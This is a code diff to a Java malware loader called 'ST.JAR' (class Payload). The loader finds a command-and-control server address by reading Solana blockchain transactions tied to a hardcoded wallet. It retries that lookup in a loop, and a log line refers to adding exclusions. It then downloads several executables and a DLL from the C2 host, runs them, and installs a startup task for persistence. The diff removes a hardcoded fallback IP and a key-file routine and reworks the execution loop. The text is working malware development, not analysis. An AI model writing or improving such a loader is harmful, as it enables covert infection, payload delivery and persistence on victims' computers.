@@ -10,7 +10,6 @@ import java.util.Comparator;
 public class Payload {
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
-    private static final String FALLBACK_SERVER = "95.182.96.216";
 
     public static void main(String[] args) {
         log("--- STARTING ST.JAR ---");
@@ -23,8 +22,15 @@ public class Payload {
                 ip = args[1].trim();
             } else {
                 log("No arguments passed. Fetching IP from Solana...");
-                ip = getC2Ip();
-                key = readKeyJson();
+                // Loop until we get an IP or the program is terminated
+                while (ip == null || ip.isEmpty()) {
+                    ip = getC2Ip();
+                    if (ip == null) {
+                        log("Failed to get IP from Solana. Retrying in 30 seconds...");
+                        Thread.sleep(30000);
+                    }
+                }
+                key = "all"; // Fallback if not passed by stager
             }
 
             log("Key: " + key + " | IP: " + ip);
@@ -91,27 +97,11 @@ public class Payload {
         return dir;
     }
 
-    private static String readKeyJson() {
-        try {
-            File keyFile = new File(getLoaderDir(), "key.json");
-            if (keyFile.exists()) {
-                String content = new String(Files.readAllBytes(keyFile.toPath()));
-                int start = content.indexOf("\"key\":\"") + 7;
-                int end = content.indexOf("\"", start);
-                if (start > 6 && end > start) {
-                    String k = content.substring(start, end);
-                    if (!k.equals("all")) return k;
-                }
-            }
-        } catch (Exception e) {}
-        return "";
-    }
-
     private static String getC2Ip() {
         try {
             String sigPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getSignaturesForAddress\",\"params\":[\"" + SOLANA_WALLET + "\",{\"limit\":10}]}";
             String sigRes = httpPost(SOLANA_RPC, sigPayload);
-            if (sigRes == null) return FALLBACK_SERVER;
+            if (sigRes == null) return null;
 
             java.util.List<String> sigs = new java.util.ArrayList<>();
             String searchKey = "\"signature\":\"";
@@ -125,7 +115,7 @@ public class Payload {
                 }
             }
 
-            if (sigs.isEmpty()) return FALLBACK_SERVER;
+            if (sigs.isEmpty()) return null;
 
             for (String sig : sigs) {
                 String txPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getTransaction\",\"params\":[\"" + sig + "\",{\"encoding\":\"json\"}]}";
@@ -148,7 +138,7 @@ public class Payload {
         } catch (Exception e) {
             log("Solana error: " + e.toString());
         }
-        return FALLBACK_SERVER;
+        return null;
     }
 
     private static String httpPost(String urlStr, String jsonBody) {
@@ -215,35 +205,27 @@ public class Payload {
                 log("Failed to add exclusions: " + e.toString());
             }
 
-            // Explicitly write the correct key to key.json BEFORE running 1.exe
-            try {
-                File keyFile = new File(loaderDir, "key.json");
-                String body = "{\n  \"key\": \"" + key + "\"\n}\n";
-                Files.write(keyFile.toPath(), body.getBytes());
-                log("Wrote correct key.json");
-            } catch (Exception e) {
-                log("Failed to write key.json: " + e.toString());
-            }
-
             log("Downloading payloads...");
             String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
             for (String file : files) {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
-            log("Executing 3.exe...");
-            new ProcessBuilder(".\\3.exe", "all")
-                .directory(loaderDir).start();
-            
-            log("Executing 2.exe...");
-            new ProcessBuilder(".\\2.exe", "all")
-                .directory(loaderDir).start();
-            
-            Thread.sleep(2000);
-            
-            log("Executing 1.exe...");
-            new ProcessBuilder(".\\1.exe", "all")
-                .directory(loaderDir).start();
+            String[] exesToRun = {"3.exe", "2.exe", "1.exe"};
+            for (String exe : exesToRun) {
+                File exeFile = new File(loaderDir, exe);
+                if (exeFile.exists()) {
+                    log("Executing " + exe + "...");
+                    try {
+                        new ProcessBuilder(".\\" + exe, key).directory(loaderDir).start();
+                    } catch (Exception e) {
+                        log("Execute error for " + exe + ": " + e.getMessage());
+                    }
+                    Thread.sleep(1000);
+                } else {
+                    log("Skipping " + exe + " (file not found)");
+                }
+            }
 
             installStartupTask(key, ip);
 
